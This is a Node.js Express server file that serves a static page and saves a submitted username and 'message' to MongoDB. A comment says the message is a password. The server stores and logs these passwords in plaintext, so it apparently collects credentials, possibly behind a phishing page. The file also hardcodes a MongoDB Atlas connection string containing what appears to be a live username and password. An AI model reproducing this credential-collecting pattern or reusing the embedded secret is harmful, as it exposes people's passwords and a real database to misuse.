// Import required dependencies
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');

// Initialize the app
const app = express();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files (HTML, CSS, JS, images) from the "public" folder
app.use(express.static(path.join(__dirname, '..', 'public')));

// MongoDB Atlas connection string
const mongoURI = 'mongodb+srv://coderrohit2927:Rohit%402927@cluster0.45pafsa.mongodb.net/?retryWrites=true&w=majority';

// Connect to MongoDB Atlas
mongoose.connect(mongoURI)
  .then(() => console.log('Connected to MongoDB Atlas'))
  .catch(err => console.error('Error connecting to MongoDB:', err));

// Define a schema and model for user data
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  message: { type: String, required: true }, // Message = password for your use case
});

const User = mongoose.model('User', userSchema);

// Route to handle form submission
app.post('/submit', async (req, res) => {
  try {
    const { username, message } = req.body;

    // Save the user data to the database
    const newUser = new User({ username, message });
    await newUser.save();

    console.log('Data saved:', { username, message });
    res.status(200).send('Data saved successfully!');
  } catch (error) {
    console.error('Error saving data:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Serve the main HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// Export the app for Vercel
module.exports = app;

// Start the server locally if not on Vercel
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
}
